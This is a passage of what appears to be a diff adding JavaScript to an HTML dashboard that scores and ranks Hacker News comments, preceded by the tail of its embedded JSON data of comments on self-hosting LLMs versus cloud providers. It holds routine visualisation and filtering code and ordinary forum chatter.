probably additional staking penalties with each user? I see people saying this isn't necessary for sub 100 employee businesses, but how does that work out if you have 100 users?"}, {"id": 50497793, "au": "Danox", "dom": 29, "sr": 36, "sc": 0.23, "ep": 1.77, "bs": 0.0, "d": 1, "age": 4.61, "grav": 30.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 46, "qw": 0, "k": 621, "kpp": 0.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.554, "fa": 0.0, "gp": 0.323, "bl": 0.0, "ds": 0.0, "txt": "If you’re doing any work near and dear to your heart, that you think is gonna have some type of significance, some type of value, if you don’t care about privacy and are not doing anything about it upfront, don’t cry on the back end."}, {"id": 50497918, "au": "Lucasoato", "dom": 21, "sr": 37, "sc": -0.16, "ep": 0.94, "bs": 0.0, "d": 2, "age": 4.37, "grav": 28.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 29, "qw": 0, "k": 2156, "kpp": 3.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.402, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Exactly, in fields like health, police, and military you really can’t accept the risks of your data leaking to a provider even if they claim to offer zero data retention."}, {"id": 50497949, "au": "tomrod", "dom": 34, "sr": 38, "sc": -0.54, "ep": 1.97, "bs": 1.19, "d": 1, "age": 4.3, "grav": 27.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 25, "qw": 0, "k": 18258, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.72, "fa": 0.0, "gp": 0.192, "bl": 0.45, "ds": 0.0, "txt": "Maybe it won't be for long, if the price inflators Huang allegedly engaged in are relaxed (financing AI startups to put capacity pressure on pricing)."}, {"id": 50497326, "au": "boodleboodle", "dom": 49, "sr": 39, "sc": -0.72, "ep": 1.79, "bs": 1.19, "d": 0, "age": 5.52, "grav": 37.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 19, "qw": 0, "k": 120, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.433, "fa": 0.0, "gp": 0.537, "bl": 0.45, "ds": 0.0, "txt": "Whats the best model i should be runnning with two dgxs? Is there a reason they chose glm and not deepseek"}, {"id": 50498689, "au": "AnotherGoodName", "dom": 47, "sr": 40, "sc": -1.14, "ep": 0.35, "bs": 1.19, "d": 2, "age": 2.87, "grav": 17.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 16, "qw": 0, "k": 9712, "kpp": 5.1, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "crowd_chatter", "facet": "glm_rtx", "flbl": "Glm & Rtx (SEC)", "urls": [], "ig": 0.149, "fa": 0.0, "gp": 0.0, "bl": 0.45, "ds": 0.0, "txt": "Absolutely agree which is why i also said in the above post to run qwen for now."}, {"id": 50497808, "au": "skrebbel", "dom": 30, "sr": 41, "sc": -1.74, "ep": 2.85, "bs": 3.05, "d": 2, "age": 4.57, "grav": 29.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 13, "qw": 0, "k": 37467, "kpp": 5.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.387, "fa": 0.68, "gp": 0.0, "bl": 1.15, "ds": 0.0, "txt": "“Doing anything about it up front” meaning buying 2x$100k worth of hardware?"}, {"id": 50498879, "au": "irishcoffee", "dom": 35, "sr": 42, "sc": -1.8, "ep": 1.33, "bs": 1.59, "d": 1, "age": 2.6, "grav": 15.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 82, "qw": 0, "k": 1696, "kpp": 1.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.565, "fa": 0.0, "gp": 0.0, "bl": 0.6, "ds": 0.0, "txt": "I am really getting tired of this point. Yeah no shit renting something instead of buying it probably saves money in the short term. Like… a house, or taking an uber everywhere, or renting a musical instrument instead of buying one.\n\nThere is an invaluable, priceless sense of of ownership of a thing instead of renting a thing.\n\nIf we thought of everything the way you’re pointing out the min-maxing value of LLMs nobody would own anything except for the oligarchs. You’re good with that?"}, {"id": 50498241, "au": "cududa", "dom": 13, "sr": 43, "sc": -1.94, "ep": 0.79, "bs": 1.19, "d": 3, "age": 3.73, "grav": 23.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 18, "qw": 0, "k": 3931, "kpp": 3.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.191, "fa": 0.0, "gp": 0.236, "bl": 0.45, "ds": 0.0, "txt": "That says more about the companies and fields you chose to work in than software engineers as a whole"}, {"id": 50497802, "au": "Danox", "dom": 23, "sr": 44, "sc": -2.03, "ep": 0.7, "bs": 1.19, "d": 2, "age": 4.58, "grav": 29.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 19, "qw": 0, "k": 621, "kpp": 0.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.298, "fa": 0.0, "gp": 0.0, "bl": 0.45, "ds": 0.0, "txt": "With the blasé attitude that I see, the future is gonna be filled with lawsuits back-and-forth. It’s all incoming."}, {"id": 50499302, "au": "jacquesm", "dom": 18, "sr": 45, "sc": -2.1, "ep": 0.63, "bs": 1.19, "d": 3, "age": 1.88, "grav": 11.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 19, "qw": 0, "k": 248096, "kpp": 3.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.27, "fa": 0.0, "gp": 0.0, "bl": 0.45, "ds": 0.0, "txt": "Because the companies they work for take their NDA's, compliance and other requirements as must haves rather than optional."}, {"id": 50499274, "au": "eptcyka", "dom": 31, "sr": 46, "sc": -4.17, "ep": 0.51, "bs": 4.24, "d": 3, "age": 1.94, "grav": 11.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 10, "qw": 0, "k": 5407, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "general_commentary", "flbl": "General Commentary", "urls": [], "ig": 0.217, "fa": 0.0, "gp": 0.0, "bl": 1.6, "ds": 0.0, "txt": "What is the median salary for a senior sweng at faang?"}, {"id": 50499001, "au": "kentm", "dom": 19, "sr": 47, "sc": -4.52, "ep": 1.26, "bs": 4.24, "d": 3, "age": 2.4, "grav": 14.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 15, "qw": 0, "k": 1497, "kpp": 4.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.537, "fa": 0.0, "gp": 0.0, "bl": 1.6, "ds": 0.0, "txt": "My team does.   It’s an important constraint. Do your software developers routinely ignore critical requirements?"}, {"id": 50499291, "au": "jacquesm", "dom": 33, "sr": 48, "sc": -4.77, "ep": 1.01, "bs": 4.24, "d": 1, "age": 1.91, "grav": 11.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 8, "qw": 0, "k": 248096, "kpp": 3.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.386, "fa": 0.0, "gp": 0.069, "bl": 1.6, "ds": 0.0, "txt": "Assuming constant pricing for tokens from online suppliers."}, {"id": 50500066, "au": "boredatoms", "dom": 46, "sr": 49, "sc": -4.82, "ep": 0.96, "bs": 4.24, "d": 2, "age": 0.44, "grav": 5.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 13, "qw": 0, "k": 833, "kpp": 2.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.408, "fa": 0.0, "gp": 0.0, "bl": 1.6, "ds": 0.0, "txt": "The local models might start leaving things out of training sets soon too"}, {"id": 50497775, "au": "fulafel", "dom": 37, "sr": 50, "sc": -4.99, "ep": 0.79, "bs": 4.24, "d": 1, "age": 4.65, "grav": 30.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 9, "qw": 0, "k": 13838, "kpp": 1.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.114, "fa": 0.0, "gp": 0.36, "bl": 1.6, "ds": 0.0, "txt": "The point of this hardware is that it's desktop."}, {"id": 50497834, "au": "chung8123", "dom": 26, "sr": 51, "sc": -5.1, "ep": 0.68, "bs": 4.24, "d": 1, "age": 4.52, "grav": 29.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 11, "qw": 0, "k": 597, "kpp": 1.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.095, "fa": 0.0, "gp": 0.317, "bl": 1.6, "ds": 0.0, "txt": "This is a lot of faster though.  That could be worth something."}, {"id": 50499992, "au": "vbezhenar", "dom": 15, "sr": 52, "sc": -5.16, "ep": 0.62, "bs": 4.24, "d": 4, "age": 0.61, "grav": 5.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 13, "qw": 0, "k": 16219, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 0.263, "fa": 0.0, "gp": 0.0, "bl": 1.6, "ds": 0.0, "txt": "No engineer would prefer to use inferior tools. Only managers care about that."}, {"id": 50497715, "au": "arjie", "dom": 16, "sr": 53, "sc": -5.18, "ep": 1.53, "bs": 5.17, "d": 3, "age": 4.78, "grav": 31.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 48, "qw": 0, "k": 10968, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 0.458, "fa": 0.0, "gp": 0.313, "bl": 1.95, "ds": 0.0, "txt": "Presumably some organizations are able to contain the rapacious software engineer. In those organizations, the software engineer is better able to offer this. As it happens, though, almost all of those would rather use ZDR Claude over this kind of thing just because of the BCDR issues etc."}, {"id": 50497952, "au": "nijave", "dom": 17, "sr": 54, "sc": -5.27, "ep": 1.44, "bs": 5.17, "d": 3, "age": 4.29, "grav": 27.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 36, "qw": 0, "k": 2492, "kpp": 1.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.426, "fa": 0.0, "gp": 0.301, "bl": 1.95, "ds": 0.0, "txt": "Presumably they don't and op does. I think the engineers are complaining they want LLMs and op is stuck handing data over to a 3rd party or denying them access. This would be the compromise (self hosted LLM)"}, {"id": 50497997, "au": "wrmanis", "dom": 14, "sr": 55, "sc": -5.58, "ep": 1.13, "bs": 5.17, "d": 3, "age": 4.22, "grav": 26.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 33, "qw": 0, "k": 10, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.297, "fa": 0.0, "gp": 0.296, "bl": 1.95, "ds": 0.0, "txt": "Or perhaps they are referring to more kinds of engineers. Security engineers, IT engineers, ops engineers, and so on. They are more likely to have the kinds of requirements that he's referring to."}, {"id": 50499687, "au": "leoqa", "dom": 32, "sr": 56, "sc": -9.12, "ep": 0.0, "bs": 6.89, "d": 4, "age": 1.21, "grav": 8.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 1, "qw": 0, "k": 628, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "general_commentary", "flbl": "General Commentary", "urls": [], "ig": -0.95, "fa": 0.0, "gp": 0.0, "bl": 2.6, "ds": 0.0, "txt": "350k"}, {"id": 50500023, "au": "joshheitzman", "dom": 53, "sr": 57, "sc": -9.12, "ep": 0.0, "bs": 6.89, "d": 3, "age": 0.52, "grav": 5.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 5, "qw": 0, "k": 214, "kpp": 1.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": -0.95, "fa": 0.0, "gp": 0.0, "bl": 2.6, "ds": 0.0, "txt": "What provider were you using?"}]}</script>
+<script>
+(() => {
+  const DATA = JSON.parse(document.getElementById("observatoryData").textContent);
+  const DEFAULT_W = DATA.weights;
+  const TOTAL_N = Math.max(1, DATA.comments.length);
+  const BURIED_CUTOFF = DATA.buried_cutoff || 500;
+  const RESCUE_TOP_K = DATA.rescue_top_k || 80;
+  let curW = {
+    ig: DEFAULT_W.info_gain,
+    fa: DEFAULT_W.falsifiability,
+    gp: DEFAULT_W.gravity_progeny,
+    bp: DEFAULT_W.bullshit_penalty,
+    dp: DEFAULT_W.downvote_penalty
+  };
+  let activeMode = "hn_top40";
+  let selectedId = null;
+
+  function escHtml(s) {
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+
+  // Render 01A / 01B tables (benchmark ablation OR live unsupervised diagnostics)
+  const abBody = document.getElementById("ablationBody");
+  if (abBody && DATA.ablations && DATA.ablations.length > 0) {
+    const maxAbScore = Math.max(...DATA.ablations.map(r => r.score));
+    DATA.ablations.forEach((r, idx) => {
+      const tr = document.createElement("tr");
+      if (idx === 0) tr.className = "hn-row";
+      else if (Math.abs(r.score - maxAbScore) < 0.02) tr.className = "winner";
+      tr.innerHTML = [
+        `<td>${escHtml(r.name)}</td>`,
+        `<td><strong>${r.score.toFixed(2)}</strong></td>`,
+        `<td>${r.ndcg20.toFixed(3)}</td>`,
+        `<td>${r.pairwise_concordance.toFixed(3)}</td>`,
+        `<td>${(100 * r.adversarial_acc).toFixed(1)}%</td>`,
+        `<td>${(100 * r.buried_gold_recall_top45).toFixed(1)}%</td>`,
+        `<td>${(100 * r.bullshit_sink_percentile).toFixed(1)}%</td>`,
+        `<td>${r.top20_diversity.toFixed(3)}</td>`
+      ].join("");
+      abBody.appendChild(tr);
+    });
+  }
+
+  const tBody = document.getElementById("tourneyBody");
+  if (tBody && DATA.tournament && DATA.tournament.length > 0) {
+    DATA.tournament.forEach((t, idx) => {
+      const tr = document.createElement("tr");
+      if (idx === 0) tr.className = "hn-row";
+      else if (t.disposition === "promoted_champion" || t.disposition === "promoted_best") tr.className = "winner";
+      tr.innerHTML = [
+        `<td>${escHtml(t.stage)}${t.disposition === "promoted_champion" ? " ★" : ""}</td>`,
+        `<td>${escHtml(t.sha)}</td>`,
+        `<td><strong>${t.score.toFixed(2)}</strong></td>`,
+        `<td>${t.dev_score.toFixed(2)}</td>`,
+        `<td>${t.holdout_score.toFixed(2)}</td>`
+      ].join("");
+      tBody.appendChild(tr);
+    });
+  }
+
+  const fdBody = document.getElementById("facetDiagBody");
+  if (fdBody && DATA.facet_diagnostics) {
+    DATA.facet_diagnostics.forEach((f, idx) => {
+      const tr = document.createElement("tr");
+      if (idx === 0) tr.className = "winner";
+      tr.innerHTML = [
+        `<td>${escHtml(f.label)}</td>`,
+        `<td>${f.count}</td>`,
+        `<td><strong>${f.useful}</strong></td>`,
+        `<td>${f.useful_pct.toFixed(1)}%</td>`,
+        `<td style="text-align:left">${escHtml(f.terms)}</td>`
+      ].join("");
+      fdBody.appendChild(tr);
+    });
+  }
+
+  const scBody = document.getElementById("sourceCatBody");
+  if (scBody && DATA.source_categories) {
+    if (DATA.source_categories.length === 0) {
+      const tr = document.createElement("tr");
+      tr.innerHTML = `<td>No external links</td><td>0</td>`;
+      scBody.appendChild(tr);
+    } else {
+      DATA.source_categories.forEach(sc => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `<td>${escHtml(sc.category)}</td><td><strong>${sc.count}</strong></td>`;
+        scBody.appendChild(tr);
+      });
+    }
+  }
+  const ancBox = document.getElementById("anchorListBox");
+  if (ancBox && DATA.story_anchors && DATA.story_anchors.length > 0) {
+    ancBox.textContent = "UNSUPERVISED STORY ANCHORS: " + DATA.story_anchors.join(", ");
+  }
+
+  // Bind Sliders
+  const sliderMap = [
+    ["ig", "sl_ig", "val_ig"],
+    ["fa", "sl_fa", "val_fa"],
+    ["gp", "sl_gp", "val_gp"],
+    ["bp", "sl_bp", "val_bp"],
+    ["dp", "sl_dp", "val_dp"]
+  ];
+  function syncSliders() {
+    sliderMap.forEach(([k, sid, vid]) => {
+      const el = document.getElementById(sid);
+      el.value = curW[k];
+      document.getElementById(vid).textContent = curW[k].toFixed(2);
+    });
+  }
+  sliderMap.forEach(([k, sid, vid]) => {
+    document.getElementById(sid).addEventListener("input", (e) => {
+      curW[k] = parseFloat(e.target.value);
+      document.getElementById(vid).textContent = curW[k].toFixed(2);
+      recomputeAndRender();
+    });
+  });
+  document.getElementById("resetWeightsBtn").addEventListener("click", () => {
+    curW = {
+      ig: DEFAULT_W.info_gain,
+      fa: DEFAULT_W.falsifiability,
+      gp: DEFAULT_W.gravity_progeny,
+      bp: DEFAULT_W.bullshit_penalty,
+      dp: DEFAULT_W.downvote_penalty
+    };
+    syncSliders();
+    recomputeAndRender();
+  });
+
+  function isDefaultWeights() {
+    return Math.abs(curW.ig - DEFAULT_W.info_gain) < 1e-4 &&
+           Math.abs(curW.fa - DEFAULT_W.falsifiability) < 1e-4 &&
+           Math.abs(curW.gp - DEFAULT_W.gravity_progeny) < 1e-4 &&
+           Math.abs(curW.bp - DEFAULT_W.bullshit_penalty) < 1e-4 &&
+           Math.abs(curW.dp - DEFAULT_W.downvote_penalty) < 1e-4;
+  }
+
+  const agesSorted = DATA.comments.map(c => c.age).sort((a, b) => a - b);
+  const p98Age = agesSorted.length ? agesSorted[Math.floor(0.98 * (agesSorted.length - 1))] : 12.0;
+  const MAX_AGE_PLOT = Math.max(4.0, Math.ceil(p98Age));
+
+  let liveList = [];
+  function recomputeAndRender() {
+    const useCanonical = isDefaultWeights();
+    liveList = DATA.comments.map(c => {
+      const pos = curW.ig * c.ig + curW.fa * c.fa + curW.gp * c.gp;
+      const neg = curW.bp * c.bl + curW.dp * c.ds;
+      const dynScore = useCanonical ? c.sc : (pos - neg);
+      return Object.assign({}, c, {
+        liveScore: dynScore,
+        liveEp: Math.max(0, pos),
+        liveBs: Math.max(0, neg)
+      });
+    });
+    if (useCanonical) {
+      liveList.sort((a, b) => a.sr - b.sr);
+    } else {
+      liveList.sort((a, b) => (b.liveScore - a.liveScore) || (a.dom - b.dom));
+    }
+    liveList.forEach((c, i) => { c.liveRank = i + 1; });
+    drawPhaseCanvas();
+    drawGravityCanvas();
+    renderCards();
+  }
+
+  const TIER_COLORS = {
+    epistemic_gold: "rgb(0, 230, 118)",
+    grounded_analysis: "rgb(56, 189, 248)",
+    crowd_chatter: "rgba(148, 163, 184, 0.45)",
+    meme_or_snark: "rgb(255, 179, 0)",
+    bullshit_or_flamewar: "rgba(255, 68, 0, 0.72)",
+    downvoted_sink: "rgba(110, 118, 128, 0.45)"
+  };
+
+  // Plot 1: 2D Epistemic Phase Plane
+  const pCanvas = document.getElementById("phaseCanvas");
+  const pCtx = pCanvas.getContext("2d");
+  let phasePts = [];
+  function drawPhaseCanvas() {
+    const W = pCanvas.width, H = pCanvas.height;
+    pCtx.clearRect(0, 0, W, H);
+    pCtx.strokeStyle = "rgb(30, 36, 44)";
+    pCtx.lineWidth = 1;
+    for (let i = 1; i < 6; i++) {
+      pCtx.beginPath(); pCtx.moveTo((W * i) / 6, 0); pCtx.lineTo((W * i) / 6, H); pCtx.stroke();
+      pCtx.beginPath(); pCtx.moveTo(0, (H * i) / 6); pCtx.lineTo(W, (H * i) / 6); pCtx.stroke();
+    }
+    pCtx.strokeStyle = "rgba(0, 230, 118, 0.32)";
+    pCtx.setLineDash([4, 4]);
+    pCtx.beginPath(); pCtx.moveTo(30, H - 24); pCtx.lineTo(W - 20, 20); pCtx.stroke();
+    pCtx.setLineDash([]);
+
+    const maxX = 16.5, maxY = 16.5;
+    phasePts = [];
+    const drawOrder = [...liveList].reverse();
+    drawOrder.forEach(c => {
+      const x = 32 + Math.min(1, c.liveEp / maxX) * (W - 52);
+      const y = (H - 26) - Math.min(1, c.liveBs / maxY) * (H - 46);
+      const r = c.tier === "epistemic_gold" ? 4.2 : (c.tier === "grounded_analysis" ? 2.8 : 2.0);
+      pCtx.fillStyle = TIER_COLORS[c.tier] || "rgb(148,163,184)";
+      pCtx.beginPath();
+      pCtx.arc(x, y, r, 0, Math.PI * 2);
+      pCtx.fill();
+      if (selectedId === c.id) {
+        pCtx.strokeStyle = "rgb(255, 255, 255)";
+        pCtx.lineWidth = 2;
+        pCtx.beginPath();
+        pCtx.arc(x, y, r + 4, 0, Math.PI * 2);
+        pCtx.stroke();
+      }
+      phasePts.push({ x, y, c });
+    });
+    pCtx.fillStyle = "rgb(140, 150, 162)";
+    pCtx.font = "10px ui-monospace, Menlo, monospace";
+    pCtx.fillText("EPISTEMIC POTENTIAL (INFO + FALSIFIABILITY) ->", W - 295, H - 7);
+    pCtx.fillText("BULLSHIT / SINK LOAD ^", 8, 14);
+  }
+
+  // Plot 2: news.arc Age vs HN DOM Rank
+  const gCanvas = document.getElementById("gravityCanvas");
+  const gCtx = gCanvas.getContext("2d");
+  let gravPts = [];
+  function drawGravityCanvas() {
+    const W = gCanvas.width, H = gCanvas.height;
+    gCtx.clearRect(0, 0, W, H);
+    const lr = DATA.largest_root || { slots: 0, start_dom: 1, end_dom: 1, author: "root" };
+    if (lr.slots > 1) {
+      const yStart = 20 + (lr.start_dom / TOTAL_N) * (H - 44);
+      const yEnd = 20 + (lr.end_dom / TOTAL_N) * (H - 44);
+      gCtx.fillStyle = "rgba(255, 68, 0, 0.09)";
+      gCtx.fillRect(32, yStart, W - 48, Math.max(4, yEnd - yStart));
+      gCtx.fillStyle = "rgba(255, 110, 64, 0.75)";
+      gCtx.font = "10px ui-monospace, Menlo, monospace";
+      gCtx.fillText(
+        `LARGEST SUBTREE (@${lr.author}: ${lr.slots} SLOTS, HN POS ${lr.start_dom}..${lr.end_dom})`,
+        40,
+        Math.min(H - 22, yStart + 13)
+      );
+    }
+
+    gravPts = [];
+    liveList.forEach(c => {
+      const x = 32 + Math.min(1, c.age / MAX_AGE_PLOT) * (W - 52);
+      const y = 20 + Math.min(1, c.dom / TOTAL_N) * (H - 44);
+      let col = "rgba(148, 163, 184, 0.30)";
+      let rad = 2.0;
+      if (c.tier === "epistemic_gold") { col = "rgb(0, 230, 118)"; rad = 4.2; }
+      else if (c.surf >= 4.0) { col = "rgb(255, 179, 0)"; rad = 3.2; }
+      else if (c.dt >= 2 || c.mod) { col = "rgba(255, 68, 0, 0.7)"; rad = 2.4; }
+      gCtx.fillStyle = col;
+      gCtx.beginPath();
+      gCtx.arc(x, y, rad, 0, Math.PI * 2);
+      gCtx.fill();
+      if (selectedId === c.id) {
+        gCtx.strokeStyle = "rgb(255, 255, 255)";
+        gCtx.lineWidth = 2;
+        gCtx.beginPath();
+        gCtx.arc(x, y, rad + 4, 0, Math.PI * 2);
+        gCtx.stroke();
+      }
+      gravPts.push({ x, y, c });
+    });
+    gCtx.fillStyle = "rgb(140, 150, 162)";
+    gCtx.fillText(`COMMENT AGE IN HOURS (0h -> ${MAX_AGE_PLOT}h) ->`, W - 245, H - 7);
+    gCtx.fillText("HN POS 1 (TOP)", 8, 14);
+    gCtx.fillText(`HN POS ${TOTAL_N.toLocaleString()}`, 8, H - 8);
+  }
+
+  function clearSelectedPoint() {
+    selectedId = null;
+    document.getElementById("searchInput").value = "";
+    drawPhaseCanvas();
+    drawGravityCanvas();
+    renderCards();
+  }
+
+  function attachCanvasProbe(canvas, getPts, probeElId) {
+    const probeEl = document.getElementById(probeElId);
+    function findNearest(ev, maxDistSq) {
+      const rect = canvas.getBoundingClientRect();
+      if (!rect.width || !rect.height) return null;
+      const sx = (ev.clientX - rect.left) * (canvas.width / rect.width);
+      const sy = (ev.clientY - rect.top) * (canvas.height / rect.height);
+      let best = null, bestD = maxDistSq;
+      for (const p of getPts()) {
+        const d = (p.x - sx) * (p.x - sx) + (p.y - sy) * (p.y - sy);
+        if (d < bestD) { bestD = d; best = p.c; }
+      }
+      return best;
+    }
+    function showProbeSummary(hit, isPinned) {
+      const delta = hit.dom - hit.liveRank;
+      const dStr = delta >= 0 ? `+${delta}` : `${delta}`;
+      const snippet = escHtml(hit.txt.slice(0, 88).replace(/\s+/g, " "));
+      const jumpBtns = isPinned
+        ? `<button type="button" class="probe-inline-btn" data-probe-jump="1">Comment &darr;</button>` +
+          `<button type="button" class="probe-inline-btn" data-probe-clear="1">Clear &times;</button>`
+        : "";
+      probeEl.innerHTML =
+        `<strong>@${escHtml(hit.au)}</strong> | Signal ${hit.liveRank} vs HN ${hit.dom} (${dStr})` +
+        jumpBtns +
+        `<br>"${snippet}..."`;
+      const jBtn = probeEl.querySelector("[data-probe-jump]");
+      if (jBtn) {
+        jBtn.addEventListener("click", () => {
+          document.getElementById("explorerSection").scrollIntoView({ behavior: "smooth", block: "start" });
+        });
+      }
+      const cBtn = probeEl.querySelector("[data-probe-clear]");
+      if (cBtn) {
+        cBtn.addEventListener("click", clearSelectedPoint);
+      }
+    }
+    canvas.addEventListener("mousemove", (ev) => {
+      if (selectedId !== null) return;
+      const hit = findNearest(ev, 169);
+      if (hit) showProbeSummary(hit, false);
+    });
+    canvas.addEventListener("click", (ev) => {
+      const hit = findNearest(ev, 576);
+      if (!hit) return;
+      selectedId = hit.id;
+      document.getElementById("searchInput").value = String(hit.id);
+      showProbeSummary(hit, true);
+      drawPhaseCanvas();
+      drawGravityCanvas();
+      renderCards();
+    });
+  }
+  attachCanvasProbe(pCanvas, () => phasePts, "phaseProbe");
+  attachCanvasProbe(gCanvas, () => gravPts, "gravProbe");
+
+  function formatHnBody(raw) {
+    return raw.split("\n").map(line => {
+      const safe = escHtml(line);
+      return line.trimStart().startsWith(">")
+        ? `<span class="hn-quote">${safe}</span>`
+        : safe;
+    }).join("\n");
+  }
+
+  function renderCards() {
+    const q = document.getElementById("searchInput").value.trim().toLowerCase();
+    const facet = document.getElementById("facetSelect").value;
+    let pool = liveList;
+
+    if (q) {
+      pool = pool.filter(c =>
+        String(c.id) === q ||
+        c.au.toLowerCase().includes(q.replace(/^@/, "")) ||
+        c.txt.toLowerCase().includes(q)
+      );
+    } else {
+      if (activeMode === "top_signal") {
+        pool = pool.slice(0, 60);
+      } else if (activeMode === "buried_gems") {
+        pool = pool.filter(c => c.dom > BURIED_CUTOFF && c.liveRank <= RESCUE_TOP_K);
+      } else if (activeMode === "hn_top40") {
+        pool = [...liveList].sort((a, b) => a.dom - b.dom).slice(0, 40);
+      } else if (activeMode === "c5a_rescues") {
+        pool = pool.filter(c => c.dt === 1 && c.ut >= 2);
+      } else if (activeMode === "bullshit_traps") {
+        const demoteFloor = Math.max(40, Math.round(TOTAL_N * 0.40));
+        const topCeil = Math.max(20, Math.round(TOTAL_N * 0.15));
+        pool = pool.filter(c =>
+          (c.meme > 0 && (c.k >= 5000 || c.urls.length > 0)) ||
+          (c.lu > 0 && c.urls.length > 0) ||
+          (c.dom <= topCeil && c.liveRank > demoteFloor)
+        ).slice(0, 50);
+      } else if (activeMode === "mod_morgue") {
+        pool = [...liveList].filter(c => c.mod === 1 || c.dt >= 2 || c.pp >= 4).slice(0, 50);
+      }
+    }
+
+    if (facet !== "all") {
+      pool = pool.filter(c => c.facet === facet);
+    }
+
+    const prevScrollY = window.scrollY;
+    const shown = pool.slice(0, 50);
+    const metaEl = document.getElementById("resultMeta");
+    metaEl.innerHTML =
+      `Showing ${shown.length} of ${pool.length} matching comments (mode: ${activeMode})` +
+      (q ? ` &nbsp;<button type="button" id="clearFilterBtn" class="tab-btn" style="padding:2px 8px;box-shadow:none">Clear selection</button>` : "");
+    const clrBtn = document.getElementById("clearFilterBtn");
+    if (clrBtn) {
